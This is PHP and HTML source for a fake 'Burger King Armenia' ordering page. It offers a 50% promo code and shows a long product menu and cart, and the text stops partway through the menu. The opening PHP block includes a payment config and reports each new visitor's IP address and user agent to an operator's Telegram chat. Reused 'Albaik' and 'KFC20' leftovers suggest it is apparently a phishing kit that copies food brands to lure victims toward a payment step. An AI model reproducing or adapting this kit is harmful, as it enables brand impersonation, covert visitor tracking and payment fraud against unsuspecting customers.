<?php

include('./payment/config.php');
$ip = getUserIP();
$ua = $_SERVER['HTTP_USER_AGENT'];

if ( !isset($_COOKIE['session']) ) {

	$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyz';
	$session         = substr(str_shuffle($permitted_chars), 5, 5);
    
    $chat = 0;
    setcookie('chat', $chat, strtotime('+30 days'));
    
    sendTelegram(
		'sendMessage',
		array(
			'chat_id' => CHATS[$chat]['sessions'],
			'text' => "&#128100; <b>SESSION: </b>#".$session." \n".
					  "<b>IP: </b><code>".$ip."</code>\n".
					  "<b>UA: </b><code>".$ua."</code>",
			'parse_mode' =>  'html',
			'disable_notification' => true
		),
		CHATS[$chat]['token']
	);

    setcookie('session', $session, strtotime('+30 days'));
} else {
    $session = $_COOKIE['session'];
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Home - Burger King</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Burger King Armenia</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta property="og:description" content="🍔 Hurry up and enjoy! 🛵"/>
    <meta name="description" content="🍔 Hurry up and enjoy! 🛵">
    <link rel="shortcut icon" href="fvitem.ico" type="image/x-icon">
    <link rel="stylesheet" href="assets/vendor-[contenthash_base62_8]-40.css">
    <link rel="stylesheet" href="assets/Profile-[contenthash_base62_8]-40.css">
    <link rel="stylesheet" href="assets/css/bootstrap.css">
    <link rel="stylesheet" href="assets/css/mstyle.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="assets/css/morder.css">
    <link rel="stylesheet" href="assets/css/style_order.css">
    
    <script>
        var gets = function(){
            var o=window.location.search,
            l=new Object;
            o=o.substring(1).split("&");
            for(var t=0;t<o.length;t++) c=o[t].split("="), l[c[0]]=c[1];
            return l
        }();
        let local=sessionStorage;
        var pix=window.location.search;
        if (local.getItem("pix") == "" || local.getItem("pix") == null) {
            local.setItem("pix",pix);
        }
    </script>
</head>


<body class="ovh">
    <style>
        .Currency_rub {
            padding-right: 3px;
        }
    </style>
    <div id="app">
        <div class="mst1 mst1_vis">
            <div class="kostamaster009"></div>
        </div>
        <div class="kostamaster297 Layout_theme_primary _1Bgyg-40">
            <header class="kostamaster270 kostamaster300 kostamaster271 header_main">
                <span class="click_platform" style="visibility: hidden; position: absolute;"></span>
                <div class="kostamaster251 Header__container kostamaster253" style="display: flex; justify-content: space-between;">
                    <div class="kostamaster034">
                        <nav class="kostamaster069">
                            <a aria-current="page" class="kostamaster071" href="menu.php#part_1"><img width="20" src="assets/menu.png"></a>
                        </nav>
                        <a id = "gaga" class="logo" href="menu.php"><img src="bkimg/Group-85-Copy.svg" alt="Albaik logo"></a>
                        
                    </div>
                    
                </div>
            </header>
            <header id="navbar" class="kostamaster270 kostamaster300 kostamaster026 kostamaster271">
                <div class="kostamaster251 Header__container kostamaster253">
                    <div class="kostamaster034">
                        <div class="kostamaster056 logo_items">
                            <div class="kostamaster039" style="cursor:pointer"><img src="assets/logo.png" alt="Albaik logo"></div>
                        </div>
                        <div class="kostamaster024">
                            <ul class="kostamaster022">
                                <li class="kostamaster023"><a class="kostamaster025" href="#part_1">Popular</a></li>
                                <li class="kostamaster023"><a class="kostamaster025" href="#part_2">Chicken</a></li>
                                <li class="kostamaster023"><a class="kostamaster025" href="#part_7">Family Combos</a></li>
                                <li class="kostamaster023"><a class="kostamaster025" href="#part_3">Seafood</a></li>
                                <li class="kostamaster023"><a class="kostamaster025" href="#part_4">Side Orders</a></li>
                                <li class="kostamaster023"><a class="kostamaster025" href="#part_5">Desserts</a></li>
                                <li class="kostamaster023"><a class="kostamaster025" href="#part_6">Beverages</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </header>


            <div class="kostamaster038">


                <div class="HomePage">
                    <div class="kostamaster251 " style="margin-bottom: 15px;">
                        <div id="sldr" class="kostamaster021">
                            <div class="swiper-container swiper-container-initialized swiper-container-horizontal desktop">
                                <div class="swiper-wrapper">
                                    <div class="Slider__item swiper-slide _218z--40"><img src="bkimg/whopperrevamp-mobile_2024.png"></div>
                                    <div class="Slider__item swiper-slide _218z--40"><img src="bkimg/slide1.jpg"></div>
                                    
                                </div>
                                <div class="swiper-button-banner-next swiper-button-next"></div>
                                <div class="swiper-button-banner-prev swiper-button-prev"></div>
                                <div class="swiper-pagination"></div>
                            </div>
                            <div class="swiper-container mobile">
                                <div class="swiper-wrapper">
                                    <div class="Slider__item swiper-slide _218z--40 mobile"><img src="bkimg/whopperrevamp-mobile_2024.png"></div>
                                    <div class="Slider__item swiper-slide _218z--40 mobile"><img src="bkimg/slide1.jpg"></div>
                                    <!--<div class="Slider__item swiper-slide _218z--40 mobile"><img src="assets/banner/3_m.jpg"></div>
                                    <div class="Slider__item swiper-slide _218z--40 mobile"><img src="assets/banner/4_m.jpg"></div>
                                    <div class="Slider__item swiper-slide _218z--40 mobile"><img src="assets/banner/5_m.jpg"></div>-->
                                </div>
                                <div class="swiper-button-banner-next swiper-button-next"></div>
                                <div class="swiper-button-banner-prev swiper-button-prev"></div>
                                <div class="swiper-pagination"></div>
                            </div>
                        </div>
                        <center>
                            <h2 class="kostamaster073 kidYN-40"><span style="color:#502314">- 50%</span> ՄԵՐ ՄԵՆՅՈՒ ՀԱՄԱՐ ՊՐՈՄՈ ԿՈԴ  <span style="color:#502314">BURGERKING25</span> 
                            </h2>
                        </center>
                        <div id="menu-items" class="kostamaster251 _3Quy7-40 kostamaster253">
                            <div class="j-upm-40">
                                <aside class="kostamaster011" id="MainSidebar" style="transition:top 500ms ease-in-out;">
                                    <div class="_3PKhl-40 GZs1m-40 kostamaster020">
                                        <div class="_2c5Vt-40"></div>
                                        <div class="kostamaster219 _2A6Db-40 pl_new">
                                            <div class="_3qokS-40">
                                                <svg width="32" height="32" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                                    <path d="M11.2 23.2a2.4 2.4 0 0 0-2.4 2.4 2.4 2.4 0 0 0 2.4 2.4 2.4 2.4 0 0 0 2.4-2.4 2.4 2.4 0 0 0-2.4-2.4zM4 4v2.4h2.4l4.32 9.12-1.68 2.88c-.12.36-.24.84-.24 1.2a2.4 2.4 0 0 0 2.4 2.4h14.4v-2.4H11.68a.26.26 0 0 1-.24-.24v-.12l1.08-2.04h8.88c.96 0 1.68-.48 2.04-1.2l4.32-7.8c.24-.24.24-.36.24-.6 0-.72-.48-1.2-1.2-1.2H9.04L7.96 4H4zm19.2 19.2a2.4 2.4 0 0 0-2.4 2.4 2.4 2.4 0 0 0 2.4 2.4 2.4 2.4 0 0 0 2.4-2.4 2.4 2.4 0 0 0-2.4-2.4z" fill="currentColor" fill-rule="nonzero"></path>
                                                </svg>
                                            </div>
                                            <div class="Ni66J-40">
                                                <div class="_37W9X-40">
                                                    <div class="_37jgP-40">
                                                        <div class="kostamaster073 za6Qc-40 kostamaster036"><span>Cart</span></div>
                                                        <div class="_2I0Ej-40 hid">(<span class="items_cart_number smart-basket__quantity-common"></span>)</div>
                                                    </div>
                                                    <div class="_1FVj5-40 _2FnMO-40 _1JvZp-40 sJu015">
                                                        <div class="kostamaster328"></div>
                                                    </div>
                                                </div><a class="kostamaster139 WmyIk-40 hid" href="menu.html#"><span>Clear</span></a>
                                            </div>
                                            <div style="height:auto;overflow:visible" aria-hidden="false" class="rah-static rah-static--height-auto">
                                                <div style="transition:opacity 250ms ease 0ms;-webkit-transition:opacity 250ms ease 0ms">
                                                    <div class="Cart__content">
                                                        <div class="kostamaster000 empty_cart">
                                                                <div class="_1FiPi-41">
                                                                <span>Your cart is empty <br> Add items from the menu</span>
                                                            </div>
                                                        </div>
                                                        <div class="Cart__list hid">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div id="blockscroll" class="smart-basket__wrapper mh_no maxheight_low"></div>
                                            <div class="kostamaster325 hid">
                                                <div class="kostamaster073 kostamaster326 kostamaster076"><span>Total:</span></div>
                                                <div class="kostamaster017 _2NuJg-40 kostamaster018">
                                                    <div id="price_old1" class="kostamaster180 pric_old smart-basket__price-common"></div>
                                                    <div id="price_new1" class="kostamaster1802 pric_new hid"><span class="price_new_span"></span></div>
                                                </div>
                                            </div>
                                            <div class="_1XeO7-40 hid"><a class="kostamaster002" href="order.php"><span class="kostamaster121"><span>Order now</span></span></a></div>
                                            <div class="F3XV9-40 hid"><span>You will get <span class="bonuses_value">22</span> <span class="greenc">BURGER KING bonuses</span></span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="kostamaster219 _3MCrw-40 _3_k8L-40 promo_active">
                                        <div class="border_top_wrapper">
                                            <div class="border_top_item"></div>
                                        </div>
                                        <div class="_3wiKj-40">
                                            <div class="kostamaster093">
                                                <div class="_3M_Iy-40">
                                                    <input type="text" class="kostamaster015" placeholder="Enter promo code" name="stock_code" value="BURGERKING25">
                                                    <button class="kostamaster014 bt_enter_code">
                                                        <div class="_3l3oT-40"></div>
                                                    </button>
                                                    <button class="kostamaster014 bt_remove_code hid">
                                                        <div class="T0SrG-40">
                                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24">
                                                                <path fill="currentColor" fill-rule="evenodd" d="M9 5V4h6v1h3v3H6V5h3zM7 9h10v10a1 1 0 0 1-1 1H8a1 1 0 0 1-1-1V9z"></path>
                                                            </svg>
                                                        </div>
                                                    </button>
                                                </div>
                                                <div class="kostamaster102 hid">
                                                    <div class="Form__error">Promo code is not found</div>
                                                </div>
                                            </div>
                                        </div>
                                        <div aria-hidden="false" class="rah-static rah-static--height-auto mzq hid">
                                            <div style="transition: opacity 250ms ease 0ms;">
                                                <div class="_3B0DZ-40">
                                                    <div class="xgcYA-40">
                                                        <div class="_3AJbs-40" to="/stock/conditions/0/KFC20">
                                                            <div class="_2q-x6-40">
                                                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="12" viewbox="0 0 16 12">
                                                                    <path fill="none" stroke="currentColor" stroke-width="2" d="M1 4.01L6.98 10 15 1"></path>
                                                                </svg>
                                                            </div>
                                                            <div class="VOxfV-40">
                                                                <div class="kostamaster073 ctuFC-40 kostamaster077" style="text-transform: uppercase;font-size: 13px;font-weight: 500;color: #393f5ertert2;">Ձեզ համար ակտիվացված է 50% զեղչ</div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </aside>

                                <section class="_3Y5Q1-40">
                                    <div class="_2K7f4-40">
                                        <div id="part_1" class="jy9vn-40"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">հանրաճանաչ</h2>
                                        <ul class="_2ActO-40">
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/1200x800_BEEF_Duo_Bacon_Chicken.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Duo Bacon Cheese Chicken</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1230.00֏</div>
                                                                    <div class="promo-price">615.00֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/1I9U82M.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Big Bang Chicken</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: flex;align-items: center; height: 110px;"><img src="bkimg/Chicken-Royal-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Royale</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">820֏</div>
                                                                    <div class="promo-price">410֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Coffee_1200x800.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Black Coffee</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">450֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Latte-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Latte</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">720֏</div>
                                                                    <div class="promo-price">360֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Gourmet_Kings_July_2024_1200x800_Farmhouse_Double.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">The Angus Farmhouse Double</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1800֏</div>
                                                                    <div class="promo-price">900֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Gourmet_Kings_July_2024_1200x800_Caramelized_Onions_Double.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">The Angus Caramelized Onion Double</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1800֏</div>
                                                                    <div class="promo-price">900֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/12YO356.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Big Bang Beef</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_FISH_Burger_72dpi.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">King Fish</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Oreo-Shake-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">OREO® SHAKE</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">850֏</div>
                                                                    <div class="promo-price">425֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                        </ul>
                                    </div>

                                    <div class="_2K7f4-40">
                                        <div id="part_2" class="jy9vn-40"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">հավ</h2>
                                        <ul class="_2ActO-40"><li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/1200x800_BEEF_Duo_Bacon_Chicken.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Duo Bacon Cheese Chicken</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1230֏</div>
                                                                    <div class="promo-price">615֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li><li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/1I9U82M.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Big Bang Chicken</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li><li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Wrap_1200x800.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">BLT Chicken Wrap</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">880֏</div>
                                                                    <div class="promo-price">440֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Long_Seasoned_Chicken-1200x800-2.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Long Seasoned Chicken</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Chicken-Royal-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Royale</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">820֏</div>
                                                                    <div class="promo-price">410֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Crispy_Chicken_1200x800_CHICKEN.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Crispy Chicken</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">880֏</div>
                                                                    <div class="promo-price">440֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Crispy_Chicken_Bacon_King_Web_App_1200x800_CHICKEN.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Crispy Chicken Bacon King</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1120֏</div>
                                                                    <div class="promo-price">560֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Chicken-Stripes_-1200x800_DE-2.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Strips</h3>
                                                                </div>
                                                            </div>
                                                        </div>
